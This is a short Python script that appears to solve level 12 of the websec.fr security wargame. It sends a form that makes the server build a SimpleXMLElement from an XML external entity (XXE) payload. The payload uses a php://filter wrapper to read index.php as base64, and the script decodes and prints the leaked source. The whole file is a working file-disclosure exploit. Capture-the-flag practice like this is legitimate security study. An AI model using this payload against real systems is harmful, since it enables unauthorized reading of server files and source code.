from requests import *
from bs4 import BeautifulSoup
import base64

url = 'http://websec.fr/level12/index.php'
data = {
    'class' : 'simplexmlelement',
    'param1' : '<!DOCTYPE foo [<!ELEMENT foo ANY> <!ENTITY xxe SYSTEM "php://filter/read=convert.base64-encode/resource=index.php">]> <foo>&xxe; </foo>',
    'param2' : '2'
}

r = post(url , data=data)
soup = BeautifulSoup(r.text , 'html.parser')
base64_source = soup.find('pre').get_text()

source = base64.b64decode(base64_source).decode('utf-8')
print(source)